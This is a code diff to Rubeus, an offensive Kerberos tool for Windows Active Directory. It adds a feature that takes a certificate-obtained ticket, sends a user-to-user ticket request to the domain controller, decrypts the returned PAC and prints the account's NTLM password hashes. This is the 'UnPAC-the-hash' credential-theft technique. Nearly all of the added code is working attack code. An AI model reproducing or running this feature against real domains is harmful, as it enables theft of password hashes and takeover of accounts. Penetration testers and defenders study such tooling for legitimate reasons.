@@ -1,9 +1,12 @@
 ﻿using System;
 using System.IO;
 using System.Security.Cryptography.X509Certificates;
+using System.Linq;
 using Asn1;
 using Rubeus.lib.Interop;
 using Rubeus.Asn1;
+using Rubeus.Kerberos;
+using Rubeus.Kerberos.PAC;
 
 
 namespace Rubeus {
@@ -129,7 +132,7 @@ namespace Rubeus {
             }
         }
 
-        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "") {
+        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool getCredentials = false) {
             try {
 
                 X509Certificate2 cert = FindCertificate(certFile, certPass);
@@ -145,7 +148,7 @@ namespace Rubeus {
                 Console.WriteLine("[*] Building AS-REQ (w/ PKINIT preauth) for: '{0}\\{1}'", domain, userName);
 
                 AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype, verifyCerts);
-                return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true, false, servicekey);
+                return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true, false, servicekey, getCredentials);
 
             } catch (KerberosErrorException ex) {
                 KRB_ERROR error = ex.krbError;
@@ -186,7 +189,7 @@ namespace Rubeus {
             }
         }
 
-        public static byte[] InnerTGT(AS_REQ asReq, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false, string serviceKey = "")
+        public static byte[] InnerTGT(AS_REQ asReq, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false, string serviceKey = "", bool getCredentials = false)
         {
             if ((ulong)luid != 0) {
                 Console.WriteLine("[*] Target LUID : {0}", (ulong)luid);
@@ -225,7 +228,7 @@ namespace Rubeus {
                     Console.WriteLine("[+] TGT request successful!");
                 }
 
-                byte[] kirbiBytes = HandleASREP(responseAsn, etype, asReq.keyString, outfile, ptt, luid, describe, verbose, asReq, serviceKey);
+                byte[] kirbiBytes = HandleASREP(responseAsn, etype, asReq.keyString, outfile, ptt, luid, describe, verbose, asReq, serviceKey, getCredentials, dcIP);
 
                 return kirbiBytes;
             }
@@ -400,6 +403,8 @@ namespace Rubeus {
                     KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                     if (String.IsNullOrEmpty(servicekey) && u2u)
                         servicekey = Helpers.ByteArrayToString(clientKey);
+                    if (String.IsNullOrEmpty(asrepkey) && u2u)
+                        asrepkey = Helpers.ByteArrayToString(clientKey);
 
                     LSA.DisplayTicket(kirbi, 2, false, false, false, false, 
                         string.IsNullOrEmpty(servicekey) ? null : Helpers.StringToByteArray(servicekey), string.IsNullOrEmpty(asrepkey) ? null : Helpers.StringToByteArray(asrepkey));
@@ -432,7 +437,7 @@ namespace Rubeus {
             return null;
         }
 
-        private static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null, string serviceKey = "")
+        private static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null, string serviceKey = "", bool getCredentials = false, string dcIP = "")
         {
             // parse the response to an AS-REP
             AS_REP rep = new AS_REP(responseAsn);
@@ -571,6 +576,87 @@ namespace Rubeus {
             {
                 KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                 LSA.DisplayTicket(kirbi, 2, false, false, false, false, string.IsNullOrEmpty(serviceKey) ? null : Helpers.StringToByteArray(serviceKey), key);
+            }
+
+            if (getCredentials)
+            {
+                Console.WriteLine("[*] Getting credentials using U2U\r\n");
+                byte[] u2uBytes = TGS_REQ.NewTGSReq(info.pname.name_string[0], info.prealm, info.pname.name_string[0], cred.tickets[0], info.key.keyvalue, (Interop.KERB_ETYPE)info.key.keytype, Interop.KERB_ETYPE.subkey_keymaterial, false, String.Empty, false, false, false, false, cred, false, true);
+                byte[] u2uResponse = Networking.SendBytes(dcIP, 88, u2uBytes);
+                if (u2uResponse == null)
+                {
+                    return null;
+                }
+                AsnElt u2uResponseAsn = AsnElt.Decode(u2uResponse);
+
+                // check the response value
+                int responseTag = u2uResponseAsn.TagValue;
+
+                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
+                {
+                    // parse the response to an TGS-REP and get the PAC
+                    TGS_REP u2uRep = new TGS_REP(u2uResponseAsn);
+                    EncTicketPart u2uEncTicketPart = u2uRep.ticket.Decrypt(info.key.keyvalue, key);
+                    PACTYPE pt = u2uEncTicketPart.GetPac(key);
+
+                    // look for the credential information and print
+                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)
+                    {
+                        if (pacInfoBuffer is PacCredentialInfo ci)
+                        {
+
+                            Console.WriteLine("  CredentialInfo         :");
+                            Console.WriteLine("    Version              : {0}", ci.Version);
+                            Console.WriteLine("    EncryptionType       : {0}", ci.EncryptionType);
+
+                            if (ci.CredentialInfo.HasValue)
+                            {
+
+                                Console.WriteLine("    CredentialData       :");
+                                Console.WriteLine("      CredentialCount    : {0}", ci.CredentialInfo.Value.CredentialCount);
+
+                                foreach (var credData in ci.CredentialInfo.Value.Credentials)
+                                {
+                                    string hash = "";
+                                    if ("NTLM".Equals(credData.PackageName.ToString()))
+                                    {
+                                        int version = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 0);
+                                        int flags = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 4);
+                                        if (flags == 3)
+                                        {
+                                            hash = String.Format("{0}:{1}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(8).Take(16).ToArray()), Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
+                                        }
+                                        else
+                                        {
+                                            hash = String.Format("{0}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
+                                        }
+                                    }
+                                    else
+                                    {
+                                        hash = Helpers.ByteArrayToString((byte[])(Array)credData.Credentials);
+                                    }
+
+                                    Console.WriteLine("       {0}              : {1}", credData.PackageName, hash);
+                                }
+
+                            }
+                            else
+                            {
+                                Console.WriteLine("    CredentialData    :   *** NO KEY ***");
+                            }
+                        }
+                    }
+                }
+                else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
+                {
+                    // parse the response to an KRB-ERROR
+                    KRB_ERROR error = new KRB_ERROR(u2uResponseAsn.Sub[0]);
+                    Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+                }
+                else
+                {
+                    Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
+                }
             }
 
             return kirbiBytes;
